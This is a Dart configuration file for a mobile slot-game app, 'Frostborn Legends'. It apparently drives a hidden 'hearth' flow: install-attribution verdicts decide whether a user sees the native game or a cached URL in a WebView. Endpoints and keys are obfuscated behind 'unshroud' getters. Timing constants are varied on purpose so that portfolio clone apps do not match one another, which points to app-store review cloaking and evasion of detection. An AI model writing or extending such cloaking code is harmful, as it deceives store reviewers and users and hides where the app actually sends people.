import 'shrouded_bytes.dart';

// ============================================================
// FROST CONFIG — project-wide constants for the hearth flow
// ============================================================
// Identity values live here as plain constants (they're published
// on the App Store listing anyway; hiding them would look
// suspicious). Every credential / endpoint / UA fragment resolves
// lazily through the `unshroud*` getters in `shrouded_bytes.dart`.
// ============================================================

abstract final class FrostConfig {
  // ── Identity ────────────────────────────────────────────────
  static const String applicationId =
      'com.frostbornlegends.frostborngame';
  static const String marketId = 'com.frostbornlegends.frostborngame';
  static const String displayName = 'Frostborn Legends';

  /// Numeric iOS App Store id — empty on Android-only builds. The
  /// backend contract treats "" as "unavailable, fall back to
  /// [applicationId]".
  static const String storeNumericId = '';

  // ── Timing envelope ─────────────────────────────────────────
  // Every numeric constant sits in the range from the sibling
  // template's `.cursor/rules/relay_forge.md` but is picked so no
  // two portfolio apps carry the identical tuple.

  /// Snooze after the user taps "Skip" on the permission stage.
  /// Range: 172800..604800 (2..7 days). Frostborn ships at the
  /// minimum (2 days) so a QA jump forward by 3 days always
  /// re-triggers the invite.
  static const int permissionSnoozeSeconds = 172800;

  /// Delay before the GCD rescue call for a spurious `Organic`
  /// first callback. Range: 4..12 seconds.
  static const int organicRescueDelay = 9;

  /// Verdict POST timeout. Range: 10..25 seconds.
  static const int verdictTimeoutSeconds = 19;

  /// Await window on the first launch before hitting the verdict.
  /// Range: 20..40 seconds.
  static const int firstInstallAwaitSeconds = 32;

  /// Await window on returning launches. Range: 3..10 seconds.
  static const int returningInstallAwaitSeconds = 8;

  /// Deep-link callback wait. Range: 3..8 seconds.
  static const int deepLinkAwaitSeconds = 5;

  /// DNS probe timeout. Range: 4..9 seconds. Keep ≥ 4 s so a
  /// slow VPN tunnel does not produce a false offline verdict.
  static const int reachProbeTimeoutSeconds = 7;

  /// Debounce before committing a connectivity-drop signal into
  /// the offline route. Range: 500..1200 ms.
  static const int reachDropDebounceMs = 940;

  /// Redirect-loop retries in the WebView. Range: 1..5.
  static const int redirectLoopRetries = 3;

  /// Cached verdict URL freshness. Range: 259200..1209600 (3..14
  /// days). Frostborn ships at 7 days.
  static const int cachedUrlLifetimeSeconds = 7 * 24 * 60 * 60;

  // ── Resolved (shrouded) endpoints & credentials ──────────────
  static String get endpointUrl => unshroudEndpointUrl();
  static String get attributionKey => unshroudAttributionKey();
  static String get messagingProjectId => unshroudMessagingProject();

  static String get storeId {
    if (storeNumericId.isNotEmpty) return 'id$storeNumericId';
    return marketId;
  }

  /// The hearth path stays disabled — every install lands in the
  /// native slot game — until all three encoded values are
  /// populated. This is intentional so a developer building the
  /// APK without production keys still sees a working game.
  static bool get credentialsReady =>
      endpointUrl.isNotEmpty &&
      attributionKey.isNotEmpty &&
      messagingProjectId.isNotEmpty;
}
